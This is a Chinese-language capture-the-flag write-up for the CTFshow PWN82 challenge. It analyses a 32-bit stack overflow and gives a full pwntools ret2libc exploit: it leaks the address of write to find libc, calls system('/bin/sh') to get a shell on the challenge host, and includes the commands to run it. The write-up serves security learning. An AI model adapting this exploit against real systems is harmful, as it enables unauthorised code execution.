# CTFshow PWN82 WP

## 题目信息

目标文件：`challenges/pwn82`

```text
Arch:    i386 (32-bit)
RELRO:   No RELRO
Canary:  No canary found
NX:      Enabled
PIE:     Disabled
```

程序是 32 位 ELF，开启 NX，不能直接在栈上执行 shellcode；但没有栈保护且没有 PIE，适合使用 ret2libc。

## 漏洞分析

`show` 函数的关键逻辑如下：

```asm
lea    eax, [ebp-0x6c]
push   0x100
push   eax
push   0
call   read@plt
```

函数为栈上缓冲区分配了 `0x6c`（108）字节，却读取最多 256 字节，因此存在栈溢出。

栈布局为：

```text
buf                 108 bytes
saved ebp             4 bytes
return address        4 bytes
```

所以覆盖返回地址的偏移是：

```text
108 + 4 = 112
```

## 利用思路

### 第一阶段：泄露 libc 地址

程序导入了 `write`，可以调用其 PLT 函数泄露 GOT 中保存的真实 `write` 地址：

```text
write(1, write@got, 4)
```

32 位下函数参数通过栈传递，ROP 栈布局为：

```text
padding(112)
write@plt
show              # write 返回后再次进入 show，接收第二阶段输入
1                 # fd = stdout
write@got         # buf = write 的 GOT 表项
4                 # count = 4
```

收到 4 字节地址后，根据 libc 中的固定偏移计算基址：

```python
libc_base = leaked_write - libc.symbols["write"]
```

本题远程环境使用的 libc 偏移为：

```text
write  = 0x0e57f0
system = 0x03cf10
"/bin/sh" = 0x17b9db
```

### 第二阶段：调用 system

计算出 libc 基址后，构造：

```text
padding(112)
system
0                 # system 返回地址，占位即可
bin_sh
```

等价于调用：

```c
system("/bin/sh");
```

## Exp

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "i386"
context.log_level = args.LOG or "info"

HOST = args.HOST or "pwn.challenge.ctf.show"
PORT = int(args.PORT or 28290)
elf = ELF("./challenges/pwn82", checksec=False)

OFFSET = 112
LIBC_WRITE = 0xE57F0
LIBC_SYSTEM = 0x3CF10
LIBC_BINSH = 0x17B9DB

io = remote(HOST, PORT)
io.recvuntil(b"Welcome to CTFshowPWN!\n")

# 泄露 write@libc
leak_payload = flat(
    b"A" * OFFSET,
    elf.plt["write"],
    elf.symbols["show"],
    1,
    elf.got["write"],
    4,
)
io.send(leak_payload)

write_addr = u32(io.recvn(4))
libc_base = write_addr - LIBC_WRITE
log.info("write: %s", hex(write_addr))
log.info("libc:  %s", hex(libc_base))

# ret2libc
shell_payload = flat(
    b"A" * OFFSET,
    libc_base + LIBC_SYSTEM,
    0,
    libc_base + LIBC_BINSH,
)
io.send(shell_payload)

sleep(1)
io.sendline(b"cat /ctfshow_flag")
io.interactive()
```

## 运行

在项目根目录执行：

```bash
.venv/bin/python exploits/pwn82.py
```

也可以显式指定远程地址和端口：

```bash
.venv/bin/python exploits/pwn82.py HOST=pwn.challenge.ctf.show PORT=28290
```

## 总结

本题核心是 `read` 导致的栈溢出。由于 NX 开启，不能直接执行栈上的 shellcode；通过 `write@plt` 泄露 `write@got`，计算 libc 基址后，再使用 `system("/bin/sh")` 完成 ret2libc。
